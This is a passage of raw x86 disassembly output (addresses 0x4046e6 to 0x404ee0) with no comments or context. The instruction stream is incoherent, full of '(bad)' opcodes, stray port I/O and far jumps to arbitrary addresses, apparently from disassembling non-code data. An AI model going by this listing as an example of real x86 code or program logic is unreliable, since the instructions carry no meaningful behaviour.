  4046e6:	jp     0x404704
  4046e8:	mov    DWORD PTR [edx+0x5e3ad1d5],edx
  4046ee:	lahf   
  4046ef:	add    dl,dh
  4046f1:	cmc    
  4046f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046f3:	adc    DWORD PTR [edx],esi
  4046f5:	cmp    DWORD PTR [ecx-0x44],0xffffff8b
  4046f9:	mov    bl,0x36
  4046fb:	scas   eax,DWORD PTR es:[edi]
  4046fc:	add    DWORD PTR ds:0xe759f2f7,edx
  404702:	repz mov bx,0x41e3
  404707:	cmp    edx,edi
  404709:	arpl   WORD PTR [esi],bp
  40470b:	xchg   ebx,eax
  40470c:	inc    esp
  40470d:	push   edi
  40470e:	fstp   DWORD PTR [edx-0x10d54ea0]
  404714:	ja     0x40469b
  404716:	jo     0x40475e
  404718:	scas   al,BYTE PTR es:[edi]
  404719:	mul    BYTE PTR [esi+0x4cbb7fa5]
  40471f:	fnstcw WORD PTR [edi-0x18ea254f]
  404725:	mov    esp,0x7f8570
  40472a:	loopne 0x404758
  40472c:	repz and eax,0x4ec26db1
  404732:	push   edx
  404733:	std    
  404734:	and    al,0x39
  404736:	xchg   edi,eax
  404737:	out    dx,eax
  404738:	add    BYTE PTR [ebp-0x187f19d9],ch
  40473e:	loopne 0x40471b
  404740:	dec    esp
  404741:	sub    al,0x49
  404743:	jb     0x4047ae
  404745:	fwait
  404746:	ins    BYTE PTR es:[edi],dx
  404747:	popa   
  404748:	imul   ebp,DWORD PTR ds:0xe39e309e,0xcb306661
  404752:	popa   
  404753:	das    
  404754:	dec    esp
  404755:	jmp    0x5da5:0x5a58c848
  40475c:	mov    ds:0xc9aa212d,al
  404761:	dec    edx
  404762:	daa    
  404763:	xor    DWORD PTR [edi+0xccc5188],eax
  404769:	inc    eax
  40476a:	push   esi
  40476b:	femms  
  40476d:	jmp    0x60dc:0x29b587e5
  404774:	aam    0x36
  404776:	popf   
  404777:	stos   DWORD PTR es:[edi],eax
  404778:	push   0xffffff9f
  40477a:	ja     0x404739
  40477c:	mov    cl,ch
  40477e:	out    dx,al
  40477f:	mov    al,ds:0x9fde5571
  404784:	in     eax,0xae
  404786:	dec    edi
  404787:	inc    esp
  404788:	and    DWORD PTR ds:0x21e3442e,esi
  40478e:	jmp    DWORD PTR [ebx-0x4b6a339]
  404794:	mov    ebp,0xafd6cbc0
  404799:	inc    eax
  40479a:	aaa    
  40479b:	leave  
  40479c:	mov    eax,ds:0x775fe424
  4047a1:	xchg   esi,eax
  4047a2:	mov    esp,0x2ca93921
  4047a7:	js     0x404775
  4047a9:	xchg   ebx,eax
  4047aa:	scas   eax,DWORD PTR es:[edi]
  4047ab:	jmp    0x4047d1
  4047ad:	stc    
  4047ae:	dec    ecx
  4047af:	jl     0x40481c
  4047b1:	xor    DWORD PTR [edi+ecx*2-0x51],edx
  4047b5:	xchg   esp,eax
  4047b6:	jbe    0x4047ab
  4047b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047b9:	mov    bl,0xf5
  4047bb:	mov    eax,ds:0xeb1b4cb6
  4047c0:	mov    esp,0x3eeaa268
  4047c5:	dec    eax
  4047c6:	mov    ebx,0x959224bc
  4047cb:	xor    BYTE PTR [esi+eax*1+0x1b],bl
  4047cf:	jmp    0x4047d0
  4047d1:	or     bh,ah
  4047d3:	fdiv   DWORD PTR [edx-0x5e]
  4047d6:	ins    BYTE PTR es:[edi],dx
  4047d7:	add    DWORD PTR [edi-0x1a],edi
  4047da:	xchg   esp,eax
  4047db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047dc:	add    ah,0xc
  4047df:	cmp    dh,BYTE PTR [edx]
  4047e1:	sti    
  4047e2:	dec    BYTE PTR [edi-0x2dca0041]
  4047e8:	pop    edx
  4047e9:	shl    DWORD PTR [eax],1
  4047eb:	inc    ebp
  4047ec:	fld    st(3)
  4047ee:	(bad)  
  4047ef:	repz add cl,BYTE PTR [edx+0x720b74cf]
  4047f6:	sbb    al,0x59
  4047f8:	outs   dx,BYTE PTR ds:[esi]
  4047f9:	out    dx,al
  4047fa:	gs jno 0x404822
  4047fd:	mov    eax,0x4cbc88c8
  404802:	xor    eax,0x34081faf
  404807:	cs push edi
  404809:	mov    esp,0xae46f53c
  40480e:	add    al,BYTE PTR [eax+0x175dfe48]
  404814:	addr16 jle 0x40479a
  404817:	cmp    BYTE PTR [eax+ebp*8+0x73],al
  40481b:	and    ch,BYTE PTR [ebp+eiz*8-0x25e8195]
  404822:	sub    al,0xc
  404824:	pop    eax
  404825:	psubb  mm1,QWORD PTR [edx]
  404828:	xor    al,0xff
  40482a:	pcmpgtw mm5,QWORD PTR [ecx-0x6374343]
  404831:	sahf   
  404832:	and    bl,BYTE PTR [ebp-0x7ebd3a8c]
  404838:	mov    BYTE PTR [ebp-0x19c52065],cl
  40483e:	sbb    edi,DWORD PTR [esi+0x7a006012]
  404844:	fs fs dec ebx
  404847:	mov    esi,0xc7246cb6
  40484c:	xchg   ebp,eax
  40484d:	add    DWORD PTR [eax+esi*2],esi
  404850:	sub    edi,DWORD PTR [esi-0x36]
  404853:	call   0x5d203f49
  404858:	loop   0x404841
  40485a:	stos   DWORD PTR es:[edi],eax
  40485b:	lods   al,BYTE PTR ds:[esi]
  40485c:	xchg   edi,eax
  40485d:	pop    es
  40485e:	mov    edi,0x8f5c9b23
  404863:	les    edx,FWORD PTR [edi-0x75786c62]
  404869:	xor    al,BYTE PTR [esi]
  40486b:	xor    al,0x98
  40486d:	ins    DWORD PTR es:[edi],dx
  40486e:	(bad)  
  40486f:	aam    0x39
  404871:	out    dx,eax
  404872:	fdivr  DWORD PTR [eax+ebx*2-0x792c42aa]
  404879:	cs call 0x68c17e00
  40487f:	mov    ebx,0x2c44aff0
  404884:	sti    
  404885:	cmp    esi,ebp
  404887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404888:	cs pop edi
  40488a:	retf   
  40488b:	pop    esp
  40488c:	xchg   edx,eax
  40488d:	inc    ebp
  40488e:	les    esp,FWORD PTR [esi+0x21]
  404891:	sahf   
  404892:	pop    ebp
  404893:	(bad)  [eax+0x6a]
  404896:	sbb    bh,BYTE PTR [ecx+0x4c7b402c]
  40489c:	mov    ?,ecx
  40489e:	xor    BYTE PTR [edi+eiz*8],0x7b
  4048a2:	pop    ss
  4048a3:	push   0x4bd0b3db
  4048a8:	inc    esp
  4048a9:	and    bh,dl
  4048ab:	cdq    
  4048ac:	xor    eax,0x804dc79c
  4048b1:	xchg   ebx,eax
  4048b2:	mov    ch,0xe3
  4048b4:	add    al,0x81
  4048b6:	cmp    eax,0x5ce8103c
  4048bb:	les    esi,FWORD PTR [eax]
  4048bd:	cmp    al,0xee
  4048bf:	clc    
  4048c0:	pusha  
  4048c1:	cmp    ch,dl
  4048c3:	mov    dl,0x1c
  4048c5:	test   BYTE PTR [edi+0x8],dl
  4048c8:	jp     0x40491a
  4048ca:	in     al,dx
  4048cb:	dec    edx
  4048cd:	mov    ebx,0xf5ba0852
  4048d2:	dec    ecx
  4048d3:	cld    
  4048d4:	and    bl,BYTE PTR [edx+eax*8]
  4048d7:	or     BYTE PTR [ebp-0x56],dh
  4048da:	les    edx,FWORD PTR [eax-0x42fd5fae]
  4048e0:	fwait
  4048e1:	dec    ebx
  4048e2:	pushf  
  4048e3:	pop    DWORD PTR [ecx+eiz*4-0x69ded1ce]
  4048ea:	bound  edi,QWORD PTR [ebx]
  4048ec:	loopne 0x4048a7
  4048ee:	fnsave [eax-0x28]
  4048f1:	clc    
  4048f2:	fbld   TBYTE PTR [ecx+0x70]
  4048f5:	dec    esi
  4048f6:	xor    dh,cl
  4048f8:	test   al,0x73
  4048fa:	adc    al,0x96
  4048fc:	push   0x45
  4048fe:	fiadd  DWORD PTR [eax]
  404900:	xchg   esp,eax
  404901:	and    esi,DWORD PTR [bx-0x33]
  404905:	or     eax,0xa66111f5
  40490a:	xor    DWORD PTR [eax],0x3b05bb2
  404910:	je     0x404936
  404912:	mov    esi,0x83abb820
  404917:	icebp  
  404918:	add    al,BYTE PTR [edx-0x3ff1e56f]
  40491e:	sub    esi,esp
  404920:	or     esp,DWORD PTR [ebx+0x4b0672c2]
  404926:	sbb    ebx,DWORD PTR [esp+esi*8-0xd1bef7e]
  40492d:	popf   
  40492e:	mov    esp,0xc2ac5f09
  404933:	shl    DWORD PTR [eax*8+0xba2a017],cl
  40493a:	test   eax,0x16b85bb6
  40493f:	imul   ebx,DWORD PTR [esi-0x14],0xaaa8b4e5
  404946:	sbb    esi,edx
  404948:	inc    edi
  404949:	cmc    
  40494a:	les    esp,FWORD PTR [ecx+0x7b]
  40494d:	cs pop eax
  40494f:	mov    al,0x1b
  404951:	jge    0x4049c2
  404953:	out    0x81,al
  404955:	fst    DWORD PTR [eax]
  404957:	push   edx
  404958:	test   esp,ecx
  40495a:	pop    edi
  40495b:	jno    0x404956
  40495d:	sbb    esi,0xffffffaf
  404960:	xchg   edx,eax
  404961:	push   0x92e8d381
  404966:	mov    ah,0x9e
  404968:	push   ebx
  404969:	cdq    
  40496a:	repnz mov esp,0x35a75ba9
  404970:	xor    esp,ecx
  404972:	add    eax,0xe0bc24fd
  404977:	jp     0x40498f
  404979:	pop    ecx
  40497a:	jo     0x404992
  40497c:	gs dec edx
  40497e:	stc    
  40497f:	add    dh,BYTE PTR [edi]
  404981:	adc    DWORD PTR [eax],0x6c
  404984:	sub    ah,BYTE PTR [ecx]
  404986:	loop   0x40490a
  404988:	test   BYTE PTR [esi-0x698bbf91],0x90
  40498f:	scas   al,BYTE PTR es:[edi]
  404990:	mov    esi,0xfa88b164
  404995:	cld    
  404996:	sti    
  404997:	xchg   ecx,eax
  404998:	push   eax
  404999:	jne    0x4049c8
  40499b:	ja     0x4049a8
  40499d:	pop    ebx
  40499e:	and    ecx,edi
  4049a0:	mov    esp,0xbce45b17
  4049a5:	or     edi,eax
  4049a7:	ret    0xdc94
  4049aa:	pop    esi
  4049ab:	daa    
  4049ac:	xchg   edi,eax
  4049ad:	aaa    
  4049ae:	fbld   TBYTE PTR [esi]
  4049b0:	push   ebx
  4049b1:	push   ebx
  4049b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049b3:	popf   
  4049b4:	dec    ecx
  4049b5:	and    DWORD PTR [eax-0x6],eax
  4049b8:	push   0x29
  4049ba:	ins    DWORD PTR es:[edi],dx
  4049bb:	mov    bh,BYTE PTR [ebp-0x75]
  4049be:	mov    edi,ebx
  4049c0:	retf   
  4049c1:	push   ebp
  4049c2:	and    ah,al
  4049c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049c5:	inc    eax
  4049c6:	and    al,0xb3
  4049c8:	fistp  DWORD PTR [ebx+ebx*4+0x2a2c863d]
  4049cf:	xor    DWORD PTR [ebx*2-0x2b5c694e],0x70
  4049d7:	cdq    
  4049d8:	(bad)  
  4049d9:	jmp    0x8e23bf0e
  4049de:	pop    edi
  4049df:	fsub   DWORD PTR ds:[esi]
  4049e2:	(bad)  
  4049e3:	xchg   esi,eax
  4049e4:	outs   dx,DWORD PTR ds:[esi]
  4049e5:	mov    esp,DWORD PTR [ebx-0x6b]
  4049e8:	ror    BYTE PTR ds:0x8285a8e8,cl
  4049ee:	or     edi,DWORD PTR [esi-0x30681091]
  4049f4:	xchg   ebp,eax
  4049f5:	lods   eax,DWORD PTR ds:[esi]
  4049f6:	mov    ecx,0x25256cf2
  4049fb:	add    DWORD PTR [eax],esi
  4049fd:	pop    ss
  4049fe:	mov    BYTE PTR [edx+0x2c],bh
  404a01:	mov    ecx,edi
  404a03:	dec    DWORD PTR [eax+eax*8]
  404a06:	jne    0x4049ae
  404a08:	dec    eax
  404a09:	push   ecx
  404a0a:	jb     0x404a3f
  404a0c:	jnp    0x4049ac
  404a0e:	push   0x4d
  404a10:	repnz stos BYTE PTR es:[edi],al
  404a12:	loop   0x404998
  404a14:	push   0x65101fb1
  404a19:	or     cl,BYTE PTR [edi-0x42]
  404a1c:	sahf   
  404a1d:	inc    edi
  404a1e:	inc    edi
  404a1f:	adc    ah,ch
  404a21:	int    0xb7
  404a23:	data16 jmp 0x404a74
  404a26:	ins    BYTE PTR es:[edi],dx
  404a27:	xchg   edx,eax
  404a28:	mov    edx,0x7886e8a7
  404a2d:	jb     0x404aa2
  404a2f:	aam    0x87
  404a31:	test   al,0xb8
  404a33:	div    DWORD PTR [esi+0x7754f6cc]
  404a39:	pop    ebx
  404a3a:	xchg   ecx,eax
  404a3b:	fld    QWORD PTR [esi-0x64027955]
  404a41:	mov    eax,ds:0x5bb7797a
  404a46:	bound  ebp,QWORD PTR [eax-0x49]
  404a49:	fidiv  WORD PTR [edi-0x21]
  404a4c:	stos   DWORD PTR es:[edi],eax
  404a4d:	(bad)  
  404a4f:	test   BYTE PTR [eax+0x686c854c],ch
  404a55:	jl     0x404a05
  404a57:	sub    eax,0x4252e242
  404a5c:	adc    edx,eax
  404a5e:	jb     0x404a52
  404a60:	xchg   ecx,eax
  404a61:	sub    DWORD PTR [eax+0xd],esi
  404a64:	inc    edx
  404a65:	and    DWORD PTR [ebp+0x6508d002],esp
  404a6b:	cli    
  404a6c:	into   
  404a6d:	xchg   edi,eax
  404a6e:	aad    0xf3
  404a70:	sub    ebx,DWORD PTR [ebp+0xe34f86f]
  404a76:	jbe    0x7d61a9ae
  404a7c:	jno    0x404aa0
  404a7e:	xor    cl,BYTE PTR ds:0x6544c296
  404a84:	icebp  
  404a85:	jmp    0x5cfbf8ee
  404a8a:	mov    ebp,0x161ba50d
  404a8f:	add    esp,DWORD PTR [esi+esi*4-0x18]
  404a93:	mov    esi,0x142cd4dd
  404a98:	ret    
  404a99:	leave  
  404a9a:	cmp    bh,BYTE PTR [ecx-0x599ed084]
  404aa0:	push   0x6faf7ab2
  404aa5:	sub    BYTE PTR [edx-0x67],bl
  404aa8:	cmp    DWORD PTR [ecx-0x1e262df],ebx
  404aae:	jl     0x404aec
  404ab0:	mov    al,dl
  404ab2:	adc    al,bh
  404ab4:	inc    eax
  404ab5:	adc    DWORD PTR [eax+0x71340ba],edx
  404abb:	das    
  404abc:	lock jbe 0x404af0
  404abf:	arpl   WORD PTR [ebp-0x653448c8],bp
  404ac5:	dec    ebp
  404ac6:	xor    ebx,esi
  404ac8:	mov    esi,0xd3c97ec9
  404acd:	mov    ds,WORD PTR [edx-0x559aa306]
  404ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ad4:	ss call 0x20c4:0xdde00a73
  404adc:	jle    0x404ab1
  404ade:	jne    0x404ac3
  404ae0:	xchg   BYTE PTR [edi+0x750f58e8],bl
  404ae6:	sub    DWORD PTR [eax+ecx*8-0x70],edx
  404aea:	adc    eax,0xee6b3ef8
  404aef:	push   esi
  404af0:	int3   
  404af1:	jnp    0x404ae7
  404af3:	mov    eax,0xf18c2df4
  404af8:	loopne 0x404b24
  404afa:	jl     0x404ac8
  404afc:	sar    DWORD PTR gs:[ebp-0x5248cff4],1
  404b03:	and    DWORD PTR [edi+0x1e4d87cb],0xbb8a6631
  404b0d:	(bad)  
  404b0e:	addr16 dec ebx
  404b10:	pop    edx
  404b11:	bound  esp,QWORD PTR [eax+0x7932c64f]
  404b17:	neg    DWORD PTR [ecx]
  404b19:	stos   DWORD PTR es:[edi],eax
  404b1a:	inc    edi
  404b1b:	jae    0x404b83
  404b1d:	mov    al,0xca
  404b1f:	cmp    eax,0xfed378a3
  404b24:	push   ebp
  404b25:	fistp  DWORD PTR [eax-0x23feaa6c]
  404b2b:	out    dx,al
  404b2c:	add    bh,BYTE PTR [eax+0x7c4be665]
  404b32:	add    al,0xce
  404b34:	jle    0x404aea
  404b36:	xor    edi,DWORD PTR [edi-0x27819b0b]
  404b3c:	sub    cl,dl
  404b3e:	jge    0x404b3a
  404b40:	inc    ecx
  404b41:	pop    ds
  404b42:	or     dh,BYTE PTR [eax]
  404b44:	fs mov ebx,0xef3f82af
  404b4a:	call   0x5498975d
  404b4f:	push   eax
  404b50:	add    al,BYTE PTR [ecx+0x54]
  404b53:	out    0x9b,eax
  404b55:	jbe    0x404bc4
  404b57:	jne    0x404b7f
  404b59:	xor    DWORD PTR [eax-0x29],esi
  404b5c:	or     al,0x8c
  404b5e:	scas   al,BYTE PTR es:[edi]
  404b5f:	pushf  
  404b60:	std    
  404b61:	dec    esp
  404b62:	cmc    
  404b63:	push   edx
  404b64:	push   ecx
  404b65:	mov    ?,WORD PTR [eax-0x4b4360f2]
  404b6b:	push   eax
  404b6c:	mov    edx,0x2a9fa1c8
  404b71:	aam    0x85
  404b73:	je     0x404bb8
  404b75:	or     eax,0x280f8d8f
  404b7a:	pop    esp
  404b7b:	cmc    
  404b7c:	jle    0x404b75
  404b7e:	hlt    
  404b7f:	dec    ebx
  404b80:	imul   BYTE PTR [ebp+0x1d3516f0]
  404b86:	das    
  404b87:	mov    bl,0xde
  404b89:	(bad)  
  404b8a:	(bad)  
  404b8b:	stos   DWORD PTR es:[edi],eax
  404b8c:	push   0x5d075ae6
  404b91:	fadd   st(1),st
  404b93:	add    ebp,DWORD PTR [ebp-0x2c]
  404b96:	pop    edi
  404b97:	shl    ch,0xb7
  404b9a:	je     0x404bbe
  404b9c:	pushf  
  404b9d:	mov    DWORD PTR [eax+eiz*1-0x6888a84b],ecx
  404ba4:	inc    ecx
  404ba5:	mov    dh,0xc9
  404ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ba8:	(bad)  
  404ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404baa:	imul   ebp
  404bac:	xchg   edx,eax
  404bad:	test   eax,0x4ee31636
  404bb2:	inc    ecx
  404bb3:	jp     0x404bc5
  404bb5:	mov    esi,0x812c12de
  404bba:	mov    dl,0xe
  404bbc:	les    edx,FWORD PTR ss:[edx-0x1b]
  404bc0:	pop    eax
  404bc1:	xchg   esi,eax
  404bc2:	shr    esi,cl
  404bc4:	test   eax,0xae383a24
  404bc9:	sub    cl,BYTE PTR [ecx]
  404bcb:	jecxz  0x404c4c
  404bcd:	xor    eax,0x13bc369d
  404bd2:	xlat   BYTE PTR ds:[ebx]
  404bd3:	sub    al,0x7d
  404bd5:	je     0x404c1f
  404bd7:	push   es
  404bd8:	shl    DWORD PTR [ebx+0x75],1
  404bdb:	call   0x504a:0xe4d0a9a1
  404be2:	mov    ch,0xd7
  404be4:	ja     0x404bdb
  404be6:	cmp    ch,bl
  404be8:	cdq    
  404be9:	pop    eax
  404bea:	test   al,0x1b
  404bec:	sub    al,0x76
  404bee:	daa    
  404bef:	xchg   eax,eax
  404bf1:	sbb    ch,BYTE PTR [edi]
  404bf3:	xor    edi,DWORD PTR ds:[edx+0x7963d751]
  404bfa:	ret    
  404bfb:	pushf  
  404bfc:	rcl    DWORD PTR [esi+0x22],1
  404bff:	in     al,dx
  404c00:	jo     0x404bee
  404c02:	leave  
  404c03:	xor    bh,BYTE PTR [edx+0x50]
  404c06:	mov    esp,0xbc1c8c51
  404c0b:	js     0x404c52
  404c0d:	outs   dx,DWORD PTR ds:[esi]
  404c0e:	or     ebp,esp
  404c10:	call   0xed588136
  404c15:	xchg   ebx,eax
  404c16:	jo     0x404c7f
  404c18:	adc    ah,bl
  404c1a:	pop    ds
  404c1b:	add    edi,esp
  404c1d:	add    DWORD PTR [ecx-0x6e81c9cc],esi
  404c23:	lea    esp,[eax]
  404c25:	jmp    0xb3240536
  404c2a:	dec    esi
  404c2b:	pusha  
  404c2c:	and    dh,cl
  404c2e:	inc    esp
  404c2f:	push   0x963e15e3
  404c34:	ret    
  404c35:	jecxz  0x404c93
  404c37:	or     bh,bl
  404c39:	xchg   ecx,eax
  404c3a:	fwait
  404c3b:	push   ds
  404c3c:	push   eax
  404c3d:	fdiv   DWORD PTR [ebp-0x566956c9]
  404c43:	call   0x79ea086f
  404c48:	jl     0x404c61
  404c4a:	push   ss
  404c4b:	xor    eax,0x8b20f7eb
  404c50:	push   ds
  404c51:	inc    ecx
  404c52:	loop   0x404be0
  404c54:	aas    
  404c55:	jno    0x404c76
  404c57:	xor    DWORD PTR ds:0xa010c2f8,ecx
  404c5d:	pop    edi
  404c5e:	cmp    BYTE PTR [edi+eax*4-0x13b21d14],0x8c
  404c66:	mov    BYTE PTR ds:0x490fdc35,al
  404c6c:	div    DWORD PTR [edx-0x354a971b]
  404c72:	sti    
  404c73:	or     DWORD PTR [esi-0x76],ebp
  404c76:	leave  
  404c77:	loopne 0x404c42
  404c79:	xor    DWORD PTR [edi],0xf029bcbd
  404c7f:	mov    bh,0x1c
  404c81:	test   al,0x1
  404c83:	(bad)  
  404c84:	outs   dx,BYTE PTR ds:[esi]
  404c85:	mov    ds:0x5ca3c854,al
  404c8a:	int3   
  404c8b:	jbe    0x404c46
  404c8d:	push   ds
  404c8e:	dec    esp
  404c8f:	mov    ch,0xa3
  404c91:	cmp    DWORD PTR [esi-0x6bde9d8],ebp
  404c97:	sbb    esp,DWORD PTR [ecx-0x59b5446f]
  404c9d:	repnz cmp ebp,DWORD PTR [edi]
  404ca0:	xor    al,0xcb
  404ca2:	add    ch,0x49
  404ca5:	dec    esi
  404ca6:	or     ecx,ebp
  404ca8:	pop    edi
  404ca9:	xor    DWORD PTR [edi+0x124a8f9e],ebx
  404caf:	enter  0x2ffb,0x96
  404cb3:	xchg   ebp,eax
  404cb4:	pop    edx
  404cb5:	(bad)  
  404cb7:	pusha  
  404cb8:	mov    ds:0x396ffd34,al
  404cbd:	add    edi,DWORD PTR [ebx+eiz*2+0x4334b81e]
  404cc4:	push   cs
  404cc5:	out    dx,al
  404cc6:	call   0xa2f0:0xf488bf27
  404ccd:	mov    al,ds:0xa5a1982c
  404cd2:	mov    dh,0x0
  404cd4:	or     BYTE PTR [ebx-0x3e],ch
  404cd7:	aaa    
  404cd8:	ins    DWORD PTR es:[edi],dx
  404cd9:	dec    esp
  404cda:	(bad)  
  404cdb:	jle    0x404ca9
  404cdd:	popa   
  404cde:	rol    BYTE PTR [edi],cl
  404ce0:	repnz fxch st(7)
  404ce3:	cld    
  404ce4:	mov    dl,0xa9
  404ce6:	sub    eax,0xcb91eee3
  404ceb:	cmp    DWORD PTR [edi],edi
  404ced:	mov    ds:0xc3c358b1,eax
  404cf2:	mov    ds:0x79fd16db,al
  404cf7:	pop    es
  404cf8:	mov    WORD PTR [ebx+0xea4e0c1],?
  404cfe:	push   ds
  404cff:	lahf   
  404d00:	je     0x404c82
  404d02:	inc    ebx
  404d03:	and    DWORD PTR [ebp-0x55],edi
  404d06:	push   cs
  404d07:	xchg   esp,eax
  404d08:	mov    edx,0x775a0f52
  404d0d:	out    dx,eax
  404d0e:	sub    al,0xed
  404d10:	add    bh,cl
  404d12:	xlat   BYTE PTR ds:[ebx]
  404d13:	pop    ss
  404d14:	or     al,0x71
  404d16:	lahf   
  404d17:	imul   ebp,DWORD PTR [edx-0x4c],0xceaa4405
  404d1e:	scas   al,BYTE PTR es:[edi]
  404d1f:	scas   eax,DWORD PTR es:[edi]
  404d20:	adc    DWORD PTR [edx-0x583fcc6a],edi
  404d26:	mov    ebp,DWORD PTR [edi+0x19]
  404d29:	idiv   BYTE PTR [esi-0x7f70229c]
  404d2f:	inc    edi
  404d30:	in     eax,dx
  404d31:	dec    ebx
  404d32:	mov    ah,BYTE PTR [eax-0x5d4403b7]
  404d38:	bound  ebx,QWORD PTR [edi+0x16ab4c75]
  404d3e:	jae    0x404cd0
  404d40:	clc    
  404d41:	xchg   BYTE PTR [esi-0x7ce3485e],dh
  404d47:	mov    ebx,esi
  404d49:	iret   
  404d4a:	mul    BYTE PTR [ebx+0x51]
  404d4d:	or     BYTE PTR [ebx+0x62ce8762],ch
  404d53:	xor    bl,BYTE PTR [ecx-0x23]
  404d56:	inc    ecx
  404d57:	lahf   
  404d58:	out    0x59,al
  404d5a:	or     eax,0x24bfed32
  404d5f:	inc    esp
  404d60:	repnz clc 
  404d62:	pop    ebp
  404d63:	inc    esp
  404d64:	and    ebx,DWORD PTR [ebp+0xa]
  404d67:	pop    ebx
  404d68:	mov    bl,0x9d
  404d6a:	inc    ebp
  404d6c:	push   cs
  404d6d:	call   0x6cbffb58
  404d72:	pop    ss
  404d73:	sahf   
  404d74:	jb     0x404dab
  404d76:	stc    
  404d77:	stc    
  404d78:	and    DWORD PTR [ebx-0x2e],0x43
  404d7c:	mov    BYTE PTR [edx+eax*2+0x26],al
  404d80:	sub    al,0xa4
  404d82:	clc    
  404d83:	into   
  404d84:	shl    DWORD PTR [eax],0x32
  404d87:	mov    ebp,0x288f5480
  404d8c:	pop    ds
  404d8d:	pop    es
  404d8e:	stc    
  404d8f:	fimul  WORD PTR [edi+0x16]
  404d92:	mov    dl,0xb
  404d94:	test   DWORD PTR ds:0x48355ec8,eax
  404d9a:	sbb    edi,DWORD PTR ds:0xa10fe99e
  404da0:	fstp   TBYTE PTR fs:[ebx-0x7c]
  404da4:	push   ds
  404da5:	or     eax,0xf4e36589
  404daa:	mov    eax,ebx
  404dac:	test   eax,ecx
  404dae:	jl     0x404d7a
  404db0:	push   esp
  404db1:	loop   0x404e12
  404db3:	test   DWORD PTR [edx+0x5ffc0d6e],edx
  404db9:	cmp    al,0x45
  404dbb:	dec    ebx
  404dbc:	mov    WORD PTR [edi+0x26af2be0],?
  404dc2:	jno    0x404dad
  404dc4:	mov    esp,0x95364957
  404dc9:	push   ebp
  404dca:	scas   eax,DWORD PTR es:[edi]
  404dcb:	sar    BYTE PTR [ecx],0xe9
  404dce:	push   cs
  404dcf:	scas   eax,DWORD PTR es:[edi]
  404dd0:	push   es
  404dd1:	mov    ds:0xe18f79cd,al
  404dd6:	repnz lods al,BYTE PTR ds:[esi]
  404dd8:	ins    DWORD PTR es:[edi],dx
  404dd9:	xchg   esp,eax
  404dda:	pusha  
  404ddb:	outs   dx,BYTE PTR ds:[esi]
  404ddc:	mov    ebp,0x903e8bab
  404de1:	or     ecx,DWORD PTR [esi]
  404de3:	in     al,dx
  404de4:	jns    0x404dea
  404de6:	hlt    
  404de7:	xchg   esi,eax
  404de8:	inc    eax
  404de9:	adc    eax,0xd6553eb9
  404dee:	mov    edx,0x107298d5
  404df3:	inc    edx
  404df4:	or     DWORD PTR [eax],edx
  404df6:	sbb    edx,DWORD PTR [ebp+ecx*2+0x402b2063]
  404dfd:	add    eax,0xb6ab3168
  404e02:	dec    edx
  404e03:	fild   DWORD PTR [ebx]
  404e05:	popf   
  404e06:	pop    ss
  404e07:	in     al,0x2
  404e09:	repz push eax
  404e0b:	push   ecx
  404e0c:	xchg   esi,eax
  404e0d:	mov    ebp,0x9732f8b0
  404e12:	(bad)  
  404e13:	jmp    0x8af41781
  404e18:	cmp    BYTE PTR [edi-0x6f1fe4c1],cl
  404e1e:	ds call 0x89567546
  404e24:	rcr    DWORD PTR [ebp-0x4fd87bf2],cl
  404e2a:	pop    es
  404e2b:	cmp    al,0xec
  404e2d:	retf   0x48c0
  404e30:	inc    esp
  404e31:	ss call 0x4c8aabb
  404e37:	(bad)  
  404e38:	cmp    ch,BYTE PTR [esi-0x139fb4f7]
  404e3e:	lahf   
  404e3f:	xchg   ebp,eax
  404e40:	xor    DWORD PTR [eax+0x1b025e14],ecx
  404e46:	in     al,dx
  404e47:	inc    ecx
  404e48:	in     eax,dx
  404e49:	sbb    eax,0xc3468d2a
  404e4e:	jge    0x404df6
  404e50:	dec    ebp
  404e51:	rcl    dh,0x45
  404e54:	push   edx
  404e55:	add    al,0x7f
  404e57:	push   0x84069e8b
  404e5c:	or     eax,0x8c1ed1d1
  404e61:	shr    DWORD PTR [ecx+0x5c],1
  404e64:	pop    esp
  404e65:	ins    BYTE PTR es:[edi],dx
  404e66:	ror    ebp,1
  404e68:	mov    bh,0xcb
  404e6a:	sti    
  404e6b:	bound  eax,QWORD PTR [esi-0x39]
  404e6e:	xor    BYTE PTR [ebp-0x20f7ecaa],ah
  404e74:	loopne 0x404e0d
  404e76:	xor    DWORD PTR ds:0x662759c0,eax
  404e7c:	stos   BYTE PTR es:[edi],al
  404e7d:	jne    0x404e48
  404e7f:	mov    edi,0x26a70fb6
  404e84:	popf   
  404e85:	pop    eax
  404e86:	inc    ebx
  404e87:	hlt    
  404e88:	fadd   st(7),st
  404e8a:	dec    ebx
  404e8b:	jo     0x404e67
  404e8d:	sbb    eax,0xd5bbc713
  404e92:	ret    
  404e93:	std    
  404e94:	pop    ds
  404e95:	mov    ebx,0x848a7523
  404e9a:	gs mov bh,0xd4
  404e9d:	jnp    0x404ec8
  404e9f:	dec    ebp
  404ea0:	xchg   ebp,eax
  404ea1:	imul   edx,DWORD PTR [eax],0x4c9f6a93
  404ea7:	into   
  404ea8:	popa   
  404ea9:	xor    esp,DWORD PTR [ebp-0x22f1d91a]
  404eaf:	sbb    edi,0x44
  404eb2:	add    DWORD PTR [ebx+0x3b],0xffffff81
  404eb6:	sub    BYTE PTR [esi-0x4f],dh
  404eb9:	stos   BYTE PTR es:[edi],al
  404eba:	sub    eax,0xffffffc1
  404ebd:	lock cmp ebx,eax
  404ec0:	loopne 0x404e4f
  404ec2:	ret    0xffc3
  404ec5:	sub    bx,WORD PTR [esi]
  404ec8:	jo     0x404ec3
  404eca:	adc    ebx,DWORD PTR ds:[esi]
  404ecd:	pop    ss
  404ece:	xchg   ebx,eax
  404ecf:	push   ecx
  404ed0:	inc    ebp
  404ed1:	add    eax,0x5d494483
  404ed6:	pop    ecx
  404ed7:	xor    BYTE PTR [edx],bh
  404ed9:	(bad)  
  404edb:	or     ebx,DWORD PTR [eax]
  404edd:	xchg   edi,eax
  404ede:	cmp    al,dl
  404ee0:	sbb    ebx,0x3a
